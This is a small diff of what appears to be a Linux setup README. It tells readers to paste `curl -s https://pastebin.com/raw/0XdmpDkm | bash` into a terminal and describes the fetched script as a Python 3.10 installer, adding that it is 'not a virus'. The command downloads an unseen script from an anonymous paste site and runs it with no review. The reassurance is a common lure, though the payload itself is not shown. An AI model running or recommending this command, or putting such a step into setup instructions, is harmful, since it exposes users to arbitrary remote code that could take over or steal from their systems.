@@ -12,7 +12,7 @@ FOR LINUX ( Ubuntu default )
 
 # Copy this script , and paste in the terminal , and press enter
 - ` curl -s https://pastebin.com/raw/0XdmpDkm | bash `
-- - That Python3.10 install script ( That not a virus ) 
+- That Python3.10 install script ( That not a virus ) 
 
 
 ----------------------
